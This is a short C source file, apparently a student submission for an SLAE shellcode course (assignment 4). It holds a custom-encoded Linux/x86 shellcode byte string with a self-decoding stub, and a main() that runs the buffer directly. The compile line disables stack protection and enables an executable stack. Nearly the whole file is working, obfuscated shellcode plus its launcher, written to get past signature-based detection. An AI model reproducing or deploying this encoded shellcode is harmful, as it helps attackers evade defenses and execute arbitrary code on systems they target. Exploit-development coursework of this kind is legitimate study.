/*
 *      SLAE - Assignment #4: Custom Encoded/decoded Shellcode (Linux/x86)
 *      Author: Alain Menelet 
 *      StudentID - SLAE-3763
 *      HowTo: gcc -fno-stack-protector -z execstack test_shellcode.c -o test_shellcode
 */

#include <stdio.h>
#include <string.h>


unsigned char code[] = \
"\xeb\x40\x5e\x56\x89\xf7\x31\xc9\xf7\xe1\xb9\x17\x31\xc0\x31\xdb\x31\xd2\x8a\x07\x3c\xff\x74\x1a\x8a\x57\x01\x28\xc2\x8a\x5f\x02\x28\xc3\x30\xda\x88\x16\x88\x5e\x01\x46\x46\x47\x47\x47\xe2\xdc\xeb\x0a\x8a\x5f\x01\x8a\x57\x02\x30\xd3\x88\x1e\xff\x14\x24\xe8\xbb\xff\xff\xff\x03\xfb\xcc\x04\x1a\xe5\x03\x45\xce\x05\x2e\xb5\x02\x6b\xcf\x01\x78\xf8\x08\xb8\x59\x0a\x51\x39\x0a\x66\x7d\x03\x03\x6b\x03\x50\x65\x06\x0d\x74\x06\x70\xe9\x0a\xe2\x93\x08\xb9\x5b\x03\x6b\xe4\x02\xbd\x0d\x09\x56\x89";

int main()
{

        printf("taille %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

        return 0;

}